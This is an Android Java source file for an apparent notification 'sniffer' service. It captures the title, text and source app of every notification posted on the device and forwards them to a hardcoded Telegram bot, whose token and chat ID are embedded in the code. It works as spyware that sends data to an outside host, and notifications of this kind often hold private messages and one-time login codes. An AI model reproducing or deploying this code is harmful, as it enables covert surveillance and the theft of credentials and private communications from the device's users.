package com.v8.global.sniffer;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class NotificationService extends NotificationListenerService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private OkHttpClient client = new OkHttpClient();

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "");
        String text = extras.getString(Notification.EXTRA_TEXT, "");
        String pkg = sbn.getPackageName();
        
        if (title.isEmpty() && text.isEmpty()) return;
        
        String message = "🔔 [" + pkg + "]\n" + title + "\n" + text;
        sendToTelegram(message);
    }

    @Override
    public void onListenerConnected() {
        sendToTelegram("✅ Notification Service Connected");
    }

    private void sendToTelegram(String text) {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                .post(new FormBody.Builder()
                    .add("chat_id", CHAT_ID)
                    .add("text", text)
                    .build())
                .build();
        
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onResponse(Call call, Response response) {
                try { response.close(); } catch (Exception e) {}
            }
            @Override
            public void onFailure(Call call, IOException e) {}
        });
    }
}
